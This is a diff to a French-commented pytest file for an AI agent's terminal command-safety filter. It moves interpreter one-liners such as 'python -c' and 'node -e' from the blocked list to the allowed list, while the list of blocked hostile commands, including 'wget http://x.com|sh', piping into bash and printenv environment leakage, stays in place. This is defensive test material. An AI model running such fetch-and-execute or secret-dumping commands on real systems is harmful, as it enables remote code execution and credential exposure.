@@ -31,17 +31,10 @@ class TestCommandSafety:
         "wget http://x.com|sh",
         "echo pwned | bash",
         "cat script.sh | sh",
-        # Nouveaux — shell inception
+        # Nouveaux — shell inception (toujours bloqué)
         "bash -c 'whoami'",
         "sh -c 'id'",
         "zsh -c 'ls'",
-        # Interpréteurs one-liner
-        "python3 -c 'import os; os.system(\"id\")'",
-        "python -c 'print(1)'",
-        "ruby -e 'puts 1'",
-        "perl -e 'print 1'",
-        "node -e 'console.log(1)'",
-        "php -r 'echo 1;'",
         # Fuite environnement
         "printenv",
         "printenv HOME",
@@ -79,6 +72,12 @@ class TestCommandSafety:
         "bash tests/run.sh",
         "cat requirements.txt",
         "echo 'bash version'",
+        # Interpréteurs one-liner — désormais AUTORISÉS (usage local ; l'agent
+        # peut déjà exécuter du code via un fichier, cf. commentaire blocklist).
+        "python3 -c 'import sys,json; print(json.dumps({}))'",
+        "python -c 'print(1)'",
+        "node -e 'console.log(1)'",
+        "cat data.json | python3 -c 'import sys,json; print(list(json.load(sys.stdin)))'",
     ])
     def test_commandes_normales_ok(self, terminal, cmd):
         # Ne doit pas lever d'exception
